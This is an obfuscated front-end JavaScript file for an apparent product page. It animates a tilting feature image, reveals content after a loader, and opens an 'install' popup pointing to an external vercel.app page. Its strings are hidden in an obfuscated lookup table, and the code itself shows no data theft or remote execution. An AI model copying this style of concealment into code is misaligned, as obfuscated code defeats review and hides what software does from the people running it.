const _0x37bd76=_0x5c27;(function(_0x8a8bab,_0x4d45c2){const _0x39bd9e=_0x5c27,_0xc231d4=_0x8a8bab();while(!![]){try{const _0x47957c=parseInt(_0x39bd9e(0x10c))/0x1*(parseInt(_0x39bd9e(0x10e))/0x2)+parseInt(_0x39bd9e(0xfc))/0x3*(-parseInt(_0x39bd9e(0x103))/0x4)+parseInt(_0x39bd9e(0xf7))/0x5+-parseInt(_0x39bd9e(0x113))/0x6*(parseInt(_0x39bd9e(0x114))/0x7)+-parseInt(_0x39bd9e(0x10d))/0x8*(-parseInt(_0x39bd9e(0x109))/0x9)+parseInt(_0x39bd9e(0xf4))/0xa+-parseInt(_0x39bd9e(0x102))/0xb*(parseInt(_0x39bd9e(0xfb))/0xc);if(_0x47957c===_0x4d45c2)break;else _0xc231d4['push'](_0xc231d4['shift']());}catch(_0x22bc08){_0xc231d4['push'](_0xc231d4['shift']());}}}(_0x464a,0x6e422));function openInstallPopup(){const _0x5c27da=_0x5c27,_0x463c6a=0x1f4,_0x142453=0x2bc,_0x918352=(window['screen'][_0x5c27da(0x110)]-_0x463c6a)/0x2,_0x8db6e9=(window[_0x5c27da(0x112)][_0x5c27da(0x10b)]-_0x142453)/0x2;window['open'](_0x5c27da(0xf9),'InstallWindow','width='+_0x463c6a+_0x5c27da(0xee)+_0x142453+',left='+_0x918352+_0x5c27da(0x100)+_0x8db6e9+_0x5c27da(0x111));}const imageContainer=document['querySelector']('.feature-image-container'),image=document[_0x37bd76(0x10f)]('.feature-image');function _0x5c27(_0x213125,_0x32199e){const _0x464a7e=_0x464a();return _0x5c27=function(_0x5c2724,_0x371544){_0x5c2724=_0x5c2724-0xee;let _0x33703b=_0x464a7e[_0x5c2724];return _0x33703b;},_0x5c27(_0x213125,_0x32199e);}let isMoving=![],currentX=0x0,currentY=0x0,targetX=0x0,targetY=0x0;function _0x464a(){const _0x1ad455=['block','clientY','canplay',',top=','getBoundingClientRect','44VZwNjE','12052missVK','loader','abs','.video-loader','deg)','getElementById','90wLmzrD','none','height','958LvNyiY','154688tHxNBf','722ztfSnq','querySelector','width',',resizable=yes,scrollbars=yes','screen','114fgsjVr','2009ngUacg',',height=','glowing','style','onload','display','addEventListener','4554100WZYwhp','.content','opacity','3171570FjTtpV','add','https://vulpesy.vercel.app/installcd.html','mouseleave','3126876lBBZIf','129dlwqzz'];_0x464a=function(){return _0x1ad455;};return _0x464a();}function lerp(_0x493d71,_0x5e402d,_0x1eb824){return _0x493d71+(_0x5e402d-_0x493d71)*_0x1eb824;}function animate(){const _0x5b714f=_0x37bd76;isMoving?(currentX=lerp(currentX,targetX,0.1),currentY=lerp(currentY,targetY,0.1),image['classList'][_0x5b714f(0xf8)](_0x5b714f(0xef))):(currentX=lerp(currentX,0x0,0.1),currentY=lerp(currentY,0x0,0.1),Math[_0x5b714f(0x105)](currentX)<0.01&&Math[_0x5b714f(0x105)](currentY)<0.01&&image['classList']['remove']('glowing')),imageContainer[_0x5b714f(0xf0)]['transform']='translateX(-50%)\x20perspective(1000px)\x20rotateX('+currentY+'deg)\x20rotateY('+currentX+_0x5b714f(0x107),requestAnimationFrame(animate);}imageContainer[_0x37bd76(0xf3)]('mousemove',_0x25081e=>{const _0x269ddd=_0x37bd76;isMoving=!![];const {left:_0x117e0f,top:_0x5ebbac,width:_0x5ec514,height:_0x53dacd}=imageContainer[_0x269ddd(0x101)](),_0xd5928e=(_0x25081e['clientX']-_0x117e0f)/_0x5ec514,_0x116c91=(_0x25081e[_0x269ddd(0xfe)]-_0x5ebbac)/_0x53dacd;targetX=(_0xd5928e-0.5)*-0x14,targetY=(_0x116c91-0.5)*0x14;}),imageContainer[_0x37bd76(0xf3)](_0x37bd76(0xfa),()=>{isMoving=![];}),animate(),window[_0x37bd76(0xf1)]=function(){const _0x347fb8=_0x37bd76,_0xd788e7=document[_0x347fb8(0x108)](_0x347fb8(0x104));_0xd788e7['style'][_0x347fb8(0xf6)]='0',setTimeout(()=>{const _0xe947bd=_0x347fb8;_0xd788e7['style'][_0xe947bd(0xf2)]=_0xe947bd(0x10a),document['querySelector'](_0xe947bd(0xf5))[_0xe947bd(0xf0)][_0xe947bd(0xf6)]='1';},0x1f4);const _0x52091a=document[_0x347fb8(0x108)]('video'),_0x5a2fc4=document[_0x347fb8(0x10f)](_0x347fb8(0x106));_0x5a2fc4[_0x347fb8(0xf0)][_0x347fb8(0xf2)]=_0x347fb8(0xfd),_0x52091a[_0x347fb8(0xf3)](_0x347fb8(0xff),()=>{const _0x230e78=_0x347fb8;_0x5a2fc4['style'][_0x230e78(0xf2)]=_0x230e78(0x10a);});};